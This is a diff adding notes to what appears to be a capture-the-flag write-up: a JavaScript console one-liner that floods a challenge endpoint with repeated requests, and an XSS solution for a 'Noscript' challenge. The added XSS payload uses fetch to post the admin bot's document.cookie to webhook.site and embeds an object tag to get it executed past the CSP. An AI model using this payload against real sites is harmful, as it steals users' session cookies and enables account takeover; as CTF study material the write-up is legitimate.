@@ -54,6 +54,10 @@ for i in range(10):
     print(resp.text)
 	
 ```
+OR
+
+`for(let i=0;i<10;i++)await send(new Array(100000).fill("2862152"));`
+Javascript one liner which you can directly run in console.
 
 <h2>One day one letter</h2>
 This was sort of a rev challenge. 
@@ -153,3 +157,12 @@ if __name__ == "__main__":
 <h2>Noscript</h2>
 
 We need to retrieve the admin’s cookie who is a XSS bot using playwright.
+https://xp.goodwillmischief.fr/posts/web/
+
+
+Another solution without meta tags:
+<script>fetch("https://webhook.site",{method:"POST",body:"flag ="+document.cookie})</script>
+<object data="/username/e2b49e44-9419-4881-8144-72d17223e3f2" type="text/html"></object>
+
+Changing the type from text/plain to text/html is important as the username endpoint (which has no csp and thus vulnerable and used)
+just shows the username as text which won't get it to execute when visited by admin.
